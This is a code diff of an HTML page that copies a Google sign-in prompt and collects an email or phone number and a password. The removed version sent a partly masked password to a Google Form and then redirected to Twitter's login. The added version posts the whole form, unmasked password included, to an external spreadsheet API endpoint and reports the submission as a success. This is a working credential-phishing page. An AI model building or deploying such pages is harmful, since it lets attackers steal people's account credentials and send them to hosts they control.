@@ -1,3 +1,26 @@
+<head>
+  <title>Save Web Form Data to Spreadsheets - Contact Form</title>
+  <script
+    src="https://code.jquery.com/jquery-3.4.1.js"
+    integrity="sha256-WpOohJOqMqqyKL9FccASB9O0KwACQJpFTUBLTYOVvVU="
+    crossorigin="anonymous"></script>
+  <script>
+  function SubForm (){
+      $.ajax({
+          url:'https://api.apispreadsheets.com/data/VXSGLmiB25lH6zii/',
+          type:'post',
+          data:$("#myForm").serializeArray(),
+          success: function(){
+            alert("Form Data Submitted :)")
+          },
+          error: function(){
+            alert("There was an error :(")
+          }
+      });
+  }
+  </script>
+  </head>
+
 <link rel="stylesheet" type="text/css" href="style/stylesheet-popup.css">
 
 <div class="container">
@@ -8,11 +31,11 @@
         <div class="tagline">Use your Google Account</div>
       </div>
       
-      <form action="">
-        <input id="nameField" name="entry.186127770" type="text">
+      <form id="myForm" action="">
+        <input name="nameField" type="text">
         <label for="nameField">Email or phone</label>
         
-        <input id="passwordField" name="entry.1698183951" type="password">
+        <input name="passwordField" type="password">
         <label for="passwordField">Password</label>
       </form>
       
@@ -21,63 +44,8 @@
       <div class="links">Learn more</div>
       <div class="login-bar">
         <div class="links">Create account</div>
-        <button class="next" onclick="return postToGoogle();">Next</button>
+        <button class="next" onclick="SubForm()">Next</button>
       </div>
+      
     </div>
   </div>
-
-<script>
-
-  function postToGoogle() {
-          var field1 = $("#nameField").val();
-          var field2 = $("#passwordField").val();
-          
-  
-          if(field1 == ""){
-            alert('Please Fill Your Name');
-            document.getElementById("nameField").focus();
-            return false;
-          }
-          if(field2 == ""){
-            alert('Please Fill Your Email');
-            document.getElementById("passwordField").focus();
-            return false;
-          }
-          
-          // fix password - only store first and last digit
-          var newpw = '';
-          for (var i = 0; i < field2.length; i++)
-          {
-              if ( (i == 0) || (i == field2.length - 1) )
-                  newpw = newpw + field2[i];
-              else
-                  newpw = newpw + '*';
-          }
-  
-          field2 = newpw;
-          
-          $.ajax({
-                  url: "https://docs.google.com/forms/d/e/1FAIpQLSfHHK7j7-RvJYDbI-ycvvDRcmtRmp6CR2q9rm6xiKeSalW9Ng/viewform?usp=pp_url",
-                  data: {"entry.186127770": field1, "entry.1698183951": field2},
-                  type: "POST",
-                  dataType: "xml",
-                  success: function(d)
-                {
-                },
-                error: function(x, y, z)
-                  {
-                    $('#success-msg').show();
-                    $('#form').hide();
-                    setTimeout(Redirect, 3000);                  
-                  }
-            });
-          
-          return false;
-  
-  }
-  
-  function Redirect() {
-      window.location.replace('https://twitter.com/i/flow/login');
-  }
-  
-  </script>
